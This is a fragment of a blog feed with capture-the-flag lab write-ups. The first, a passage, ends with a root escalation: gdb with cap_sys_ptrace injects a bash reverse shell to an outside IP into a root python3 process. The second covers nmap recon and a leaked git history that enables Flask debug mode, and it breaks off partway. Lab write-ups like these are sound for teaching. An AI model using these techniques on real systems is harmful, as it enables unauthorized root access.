<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style="display:flex;"><span>$ <span style="color:#f92672">[</span>ctrl-z<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>$ stty raw -echo; fg
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#66d9ef">then</span> press enter<span style="color:#f92672">]</span>
</span></span></code></pre></div><p><img src="getting_fully_interactive_shell.png" alt="Getting Fully Interactive Shell"></p>
<h2 id="post-enumeration">Post Enumeration</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.0$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>debug<span style="color:#f92672">)</span>,1003<span style="color:#f92672">(</span>faculty<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bash-5.0$ find / -group debug 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/bin/gdb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bash-5.0$ ls -la /usr/bin/gdb
</span></span><span style="display:flex;"><span>-rwxr-x--- <span style="color:#ae81ff">1</span> root debug <span style="color:#ae81ff">8440200</span> Dec  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2021</span> /usr/bin/gdb
</span></span></code></pre></div><p>User developer is part of <em>debug</em> group that owns <em>/usr/bin/gdb</em> and can run it.</p>
<p>And if I check <em>linux capabilities</em> for this binary using <em>getcap</em>, I can see that it has <em>cap_sys_ptrace</em> capability, which means that the current user can attach to other processes and trace their system calls.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.0$ getcap /usr/bin/gdb 
</span></span><span style="display:flex;"><span>/usr/bin/gdb <span style="color:#f92672">=</span> cap_sys_ptrace+ep
</span></span></code></pre></div><h2 id="getting-root">Getting root</h2>
<p>I can abuse this to attach to root running processes and call a reverse shell back to me.</p>
<p>This can be done with any process by injecting a compiled reverse shell into its memory, howerver if the process is running python3 it becomes easier, because I can call the <em>built-in python3 system function</em> and pass a reverse shell to it directly.</p>
<p>Among the running processes I will choose this python3 process:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.0$ ps aux | grep root
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">731</span>  0.0  0.9  <span style="color:#ae81ff">26896</span> <span style="color:#ae81ff">18204</span> ?        Ss   13:15   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Then I will debug it using <em>gdb</em> and inject my malicious code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gdb -p <span style="color:#ae81ff">731</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i&gt;&amp; /dev/tcp/10.10.16.59/8988 0&gt;&amp;1&#39;&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p><img src="getting_root.png" alt="Getting root"></p>
]]></content>
        </item>
        
        <item>
            <title>Opensource Write-Up</title>
            <link>https://mostxeon.github.io/posts/opensource/</link>
            <pubDate>Wed, 28 Sep 2022 08:35:17 +0300</pubDate>
            
            <guid>https://mostxeon.github.io/posts/opensource/</guid>
            <description>false</description>
            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting with a full tcp port scan I got the below results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -sV -sC -vvv -p- -oN nmap/nmap-all-tcp.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.164
</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2022-07-27 03:06:30 EEST <span style="color:#66d9ef">for</span> 129s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE    SERVICE REASON      VERSION
</span></span><span style="display:flex;"><span>22/tcp   open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOm3Ocn3qQzvKFsAf8u2wdkpi0XryPX5W33bER74CfZxc4QPasF+hGBNSaCanZpccGuPffJ9YenksdoTNdf35cvhamsBUq6TD88Cyv9Qs68kWPJD71MkSDgoyMFIe7NTdzyWJJjmUcNHRvwfo6KQsVXjwC4MN+SkL6dLfAY4UawSNhJZGTiKu0snAV6TZ5ZYnmDpnKIEZzf/dOK6bBu4SCu9DRjPknuZkl7sKp3VCoI9CRIu1tihqs1NPhFa+XnHSRsULWtQqtmxZP5UXbmgwETxmpfw8M9XcMH0QXr8JSAdDkg2NtIapmPX/a3hVFATYg+idaEEQNlZHPUKLbCTyJ
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLA9ak8TUAPl/F77SPc1ut/8B+eOukyC/0lof4IrqJoPJLYusbXk+9u/OgSGp6bJZhotkJUvhC7k0rsA7WX19Y8<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxEEb33GC5nT5IJ/YY+yDpTKQGLOK1HPsEzM99H4KKA
</span></span><span style="display:flex;"><span>80/tcp   open     http    syn-ack     Werkzeug/2.1.2 Python/3.10.3
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET OPTIONS HEAD
</span></span><span style="display:flex;"><span>|_http-title: upcloud - Upload files <span style="color:#66d9ef">for</span> Free!
</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   GetRequest: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
</span></span><span style="display:flex;"><span>|     Date: Wed, <span style="color:#ae81ff">27</span> Jul <span style="color:#ae81ff">2022</span> 00:07:01 GMT
</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">5316</span>
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;head&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;upcloud - Upload files <span style="color:#66d9ef">for</span> Free!&lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/jquery/jquery-3.4.1.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/popper/popper.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/bootstrap/js/bootstrap.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/js/ie10-viewport-bug-workaround.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/bootstrap/css/bootstrap.css&#34;</span>/&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; /static/vendor/bootstrap/css/bootstrap-grid.css&#34;</span>/&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; /static/vendor/bootstrap/css/bootstrap-reboot.css&#34;</span>/&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   HTTPOptions: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
</span></span><span style="display:flex;"><span>|     Date: Wed, <span style="color:#ae81ff">27</span> Jul <span style="color:#ae81ff">2022</span> 00:07:01 GMT
</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Allow: GET, OPTIONS, HEAD
</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|   RTSPRequest: 
</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
</span></span><span style="display:flex;"><span>|     <span style="color:#e6db74">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;html&gt;
</span></span><span style="display:flex;"><span>|     &lt;head&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html;charset=utf-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error response&lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
</span></span><span style="display:flex;"><span>|     &lt;body&gt;
</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
</span></span><span style="display:flex;"><span>|     &lt;p&gt;Message: Bad request version <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;RTSP/1.0&#39;</span><span style="color:#f92672">)</span>.&lt;/p&gt;
</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
</span></span><span style="display:flex;"><span>|_    &lt;/html&gt;
</span></span><span style="display:flex;"><span>3000/tcp filtered ppp     no-response
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port80-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>7/27%Time<span style="color:#f92672">=</span>62E081A5%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>GetR
</span></span><span style="display:flex;"><span>SF:equest,1573,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ython/3\.10\.3\r\nDate:\x20Wed,\x2027\x20Jul\x202022\x2000:07:01\x20GMT
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:5316\r\nConnection:\x20close\r\n\r\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20&lt;meta\x20charset=\&#34;UTF-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\&#34;viewport\&#34;\x20content=\&#34;width=device-width,\x20initial-scale=1\.0\&#34;&gt;\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n\x20\x20\x20\x20&lt;title&gt;upcloud\x20-\x20Upload\x20files\x20for\x20Free!
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&lt;/title&gt;\n\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/static/vendor/jquery/jque
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ry-3\.4\.1\.min\.js\&#34;&gt;&lt;/script&gt;\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/stat
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ic/vendor/popper/popper\.min\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;script
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20src=\&#34;/static/vendor/bootstrap/js/bootstrap\.min\.js\&#34;&gt;&lt;/script&gt;\n\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20&lt;script\x20src=\&#34;/static/js/ie10-viewport-bug-workaround
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:=\&#34;/static/vendor/bootstrap/css/bootstrap\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;li
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nk\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;\x20/static/vendor/bootstrap/css/boo
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tstrap-grid\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20hr
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ef=\&#34;\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\&#34;/&gt;\n\n\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20&lt;link\x20rel=&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,C7,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Wed,\x2027\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20Jul\x202022\x2000:07:01\x20GMT\r\nContent-Type:\x20text/html;\x20cha
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:rset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nContent-Length:\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\r\nConnection:\x20close\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,1F4,<span style="color:#e6db74">&#34;&lt;!DOCTYPE\x20HTM
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:L\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\&#34;http://www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equ
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:iv=\&#34;Content-Type\&#34;\x20content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;E
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:rror\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20req
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:uest\x20version\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Wed Jul 27 03:08:39 2022 -- 1 IP address (1 host up) scanned in 129.97 seconds</span>
</span></span></code></pre></div><p>I can see 2 opens ports <em>(22, 80)</em> with a third <em>(3000)</em> that appears to be filtered meaning that some sort of firewall is blocking the reply back.</p>
<p>Looking at port <em>80</em>, the banner tells us that its a python/3.10.3 based 

<a href="https://wsgi.readthedocs.io/en/latest/what.html" target="_blank"><em>WSGI</em></a> web application: 

<a href="https://werkzeug.palletsprojects.com/en/2.1.x/" target="_blank"><em>Werkzeug/2.1.2</em></a></p>
<p>By surfing the home page on port 80, I can see two buttons, one to download the source code for a certain application and the other one to go to a page where you can upload a file.</p>
<p><img src="exploring-home-page.png" alt="Exploring the Home Page"></p>
<h3 id="exploring-the-source-code">Exploring the Source Code</h3>
<p>Let&rsquo;s download the source code and inspect it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>source.zip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ unzip source.zip 
</span></span><span style="display:flex;"><span>Archive:  source.zip
</span></span><span style="display:flex;"><span>   creating: app/
</span></span><span style="display:flex;"><span>   creating: app/app/
</span></span><span style="display:flex;"><span>  inflating: app/app/views.py        
</span></span><span style="display:flex;"><span>  inflating: app/app/__init__.py     
</span></span><span style="display:flex;"><span>   creating: app/app/static/
</span></span><span style="display:flex;"><span>   creating: app/app/static/js/
</span></span><span style="display:flex;"><span>   ...
</span></span></code></pre></div><h3 id="noticing-git-directory">Noticing &ldquo;.git&rdquo; Directory</h3>
<p>If I list the contents of the zip file using &ldquo;<em>ls -la</em>&rdquo; I can see a <em>.git</em> directory</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">2460</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> kali kali    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">5</span> 00:18 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> kali kali    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">4</span> 22:39 ..
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">5</span> kali kali    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">5</span> 13:38 app
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> kali kali     <span style="color:#ae81ff">110</span> Apr <span style="color:#ae81ff">28</span> 14:40 build-docker.sh
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> kali kali    <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">28</span> 14:34 config
</span></span><span style="display:flex;"><span>-rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali     <span style="color:#ae81ff">574</span> Apr <span style="color:#ae81ff">28</span> 15:50 Dockerfile
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">8</span> kali kali    <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">28</span> 15:50 .git
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kali kali <span style="color:#ae81ff">2489147</span> Oct  <span style="color:#ae81ff">5</span> 00:00 source.zip
</span></span></code></pre></div><p>This means that we can interact with it and see more information about this application, like different <em>branches</em>,<em>logs</em> &hellip;</p>
<p>After searching around a little bit, I got something interesting:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git branches <span style="color:#75715e"># to list available branches</span>
</span></span><span style="display:flex;"><span>  dev
</span></span><span style="display:flex;"><span>* public
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ git switch dev <span style="color:#75715e"># to switch to the &#34;dev&#34; branch</span>
</span></span><span style="display:flex;"><span>Switched to branch <span style="color:#e6db74">&#39;dev&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git log <span style="color:#75715e"># to list the logs (every change and commit made to the project)</span>
</span></span><span style="display:flex;"><span>commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 <span style="color:#f92672">(</span>HEAD -&gt; dev<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:47:24 <span style="color:#ae81ff">2022</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ease testing
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:54 <span style="color:#ae81ff">2022</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    added gitignore
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:16 <span style="color:#ae81ff">2022</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    updated
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:45:17 <span style="color:#ae81ff">2022</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    initial
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git show HEAD <span style="color:#75715e"># to show the changes made on the last commit</span>
</span></span><span style="display:flex;"><span>commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 <span style="color:#f92672">(</span>HEAD -&gt; dev<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:47:24 <span style="color:#ae81ff">2022</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ease testing
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>diff --git a/Dockerfile b/Dockerfile
</span></span><span style="display:flex;"><span>index 76c7768..0875eda <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span>--- a/Dockerfile
</span></span><span style="display:flex;"><span>+++ b/Dockerfile
</span></span><span style="display:flex;"><span>@@ -29,7 +29,7 @@ ENV PYTHONDONTWRITEBYTECODE<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Set mode</span>
</span></span><span style="display:flex;"><span> ENV MODE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PRODUCTION&#34;</span>
</span></span><span style="display:flex;"><span>-# ENV FLASK_DEBUG<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>+ENV FLASK_DEBUG<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Run supervisord</span>
</span></span><span style="display:flex;"><span> CMD <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/usr/bin/supervisord&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;/etc/supervisord.conf&#34;</span><span style="color:#f92672">]</span>
